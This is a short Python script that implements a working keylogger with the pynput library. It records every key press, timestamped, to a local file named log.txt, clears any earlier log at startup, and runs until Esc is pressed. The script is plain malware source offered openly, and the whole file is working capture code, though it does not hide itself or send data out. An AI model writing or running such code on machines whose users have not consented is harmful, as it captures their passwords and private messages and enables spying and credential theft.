import logging
from pynput import keyboard
import os
import time

# Set up logging configuration
log_file = "log.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt, etc.)
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # Stop listener if Esc is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    # Start the keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger started. Press ESC to stop.")
        listener.join()

if __name__ == "__main__":
    # Check if log file exists and remove it if it does
    if os.path.exists(log_file):
        os.remove(log_file)

    # Start the keylogger
    start_keylogger()
